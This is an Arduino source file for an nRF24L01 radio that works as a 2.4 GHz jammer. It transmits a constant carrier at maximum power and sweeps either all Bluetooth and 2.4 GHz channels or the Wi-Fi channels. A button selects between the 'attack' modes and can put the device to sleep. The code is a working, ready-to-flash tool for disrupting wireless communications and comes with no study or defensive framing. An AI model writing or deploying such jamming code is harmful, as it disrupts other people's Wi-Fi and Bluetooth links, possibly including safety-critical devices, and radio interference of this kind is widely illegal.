#include <SPI.h>
#include "RF24.h"
#include <ezButton.h>
#include <string>

RF24 radio(2, 4);
byte i = 45;
ezButton button(3);

const int wifiFrequencies[] = {
  2412, 2417, 2422, 2427, 2432,
  2437, 2442, 2447, 2452, 2457, 2462
};

void addvertising() {}

int pressCount = 0;
unsigned long lastPressTime = 0;
bool sleeping = false;

void goToSleep() {
  radio.powerDown();
  for (int h = 0; h < 3; h++) {
    digitalWrite(LED_BUILTIN, LOW);
    delay(100);
    digitalWrite(LED_BUILTIN, HIGH);
    delay(100);
  }
  sleeping = true;
}

void wakeUp() {
  radio.powerUp();
  delay(200);
  radio.startConstCarrier(RF24_PA_MAX, i);
  sleeping = false;
  pressCount = 0;
}

void setup() {
  button.setDebounceTime(100);
  pinMode(LED_BUILTIN, OUTPUT);
  digitalWrite(LED_BUILTIN, HIGH);

  delay(900);
  if (radio.begin()) {
    delay(200);
    radio.setAutoAck(false);
    radio.stopListening();
    radio.setRetries(0, 0);
    radio.setPayloadSize(5);
    radio.setAddressWidth(3);
    radio.setPALevel(RF24_PA_MAX);
    radio.setDataRate(RF24_2MBPS);
    radio.setCRCLength(RF24_CRC_DISABLED);
    radio.startConstCarrier(RF24_PA_MAX, i);

    digitalWrite(LED_BUILTIN, LOW);
    delay(500);
    digitalWrite(LED_BUILTIN, HIGH);
    delay(500);
  }

  addvertising();
}

void fullAttack() {
  for (int ch = 0; ch < 80; ch++) {
    radio.setChannel(ch);
  }
}

void wifiAttack() {
  for (int i = 0; i < sizeof(wifiFrequencies) / sizeof(wifiFrequencies[0]); i++) {
    radio.setChannel(wifiFrequencies[i] - 2400);
  }
}

const char* modes[] = {
  "BLE & All 2.4 GHz",
  "Just Wi-Fi",
  "Waiting Idly :("
};
uint8_t attack_type = 2;

void loop() {
  button.loop();

  if (button.isPressed()) {
    if (millis() - lastPressTime > 2000) {
      pressCount = 0;
    }
    pressCount++;
    lastPressTime = millis();

    if (pressCount >= 4) {
      if (sleeping) {
        wakeUp();
      } else {
        goToSleep();
      }
      pressCount = 0;
      return;
    }

    if (!sleeping) {
      attack_type = (attack_type + 1) % 3;
      for (int h = 0; h <= attack_type; h++) {
        digitalWrite(LED_BUILTIN, LOW);
        delay(500);
        digitalWrite(LED_BUILTIN, HIGH);
        delay(500);
      }
    }
  }

  if (sleeping) return;

  switch (attack_type) {
    case 0: fullAttack(); break;
    case 1: wifiAttack(); break;
    case 2: break;
  }
}
